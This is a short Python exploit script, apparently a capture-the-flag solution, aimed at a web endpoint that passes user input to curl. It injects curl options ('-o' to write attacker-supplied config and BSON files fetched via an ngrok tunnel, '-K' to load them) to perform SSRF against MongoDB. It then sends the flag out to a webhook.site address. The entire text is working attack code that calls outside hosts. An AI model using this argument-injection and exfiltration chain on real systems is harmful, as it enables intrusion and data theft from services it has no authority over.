import requests
import time
base = "http://127.0.0.1:8888"
ngrok = "http://0.tcp.ap.ngrok.io:18279"
webhook = "https://webhook.site/8639dc02-2edb-4157-9b97-4595c388356e?"
proxies = {
   'http': 'http://127.0.0.1:8080',
   'https': 'http://127.0.0.1:8080',
}
requests.post(base + "/api/curr", data={"url":ngrok+"/ssrf.config", "opt":"-o", "data":"GET"}, proxies=proxies)
input()
requests.post(base + "/api/curr", data={"url":ngrok+"/bson.bin", "opt":"-o", "data":"POST"}, proxies=proxies)
input()

# perform mongo ssrf
requests.post(base + "/api/curr", data={"url":"http://example.com", "opt": "-K", "data": "GET"}, proxies=proxies)
input()


requests.post(base + "/api/curr", data={"url": ngrok+"/flag_exfil.config", "opt": "-o", "data": "GET"}, proxies=proxies)
input()

requests.post(base + "/api/curr", data={"url":webhook, "opt": "-K", "data": "GET"}, proxies=proxies)
input()